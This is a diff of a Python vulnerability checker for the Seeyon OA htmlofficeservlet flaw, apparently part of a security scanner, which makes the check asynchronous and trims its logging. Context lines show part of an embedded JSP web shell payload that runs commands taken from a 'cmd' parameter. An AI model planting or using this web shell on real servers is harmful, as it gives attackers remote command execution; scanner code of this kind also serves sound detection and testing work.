@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class See_Yon_BaseVerify:
     def __init__(self, url):
@@ -32,7 +32,7 @@ class See_Yon_BaseVerify:
                    {out.pri ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
                 '''
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -43,17 +43,11 @@ class See_Yon_BaseVerify:
         """
         
         try:
-            check_req = request.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers)
-            if check_req.status_code == 200 and "DBSTEP V3.0     0               21              0               htmoffice operate err" in check_req.text :
-                print("存在seeyou漏洞")
+            check_req = await request.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers)
+            if check_req.status == 200 and "DBSTEP V3.0     0               21              0               htmoffice operate err" in await check_req.text() :
                 return True
-            else:
-                print("不存在seeyou漏洞")
-                return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
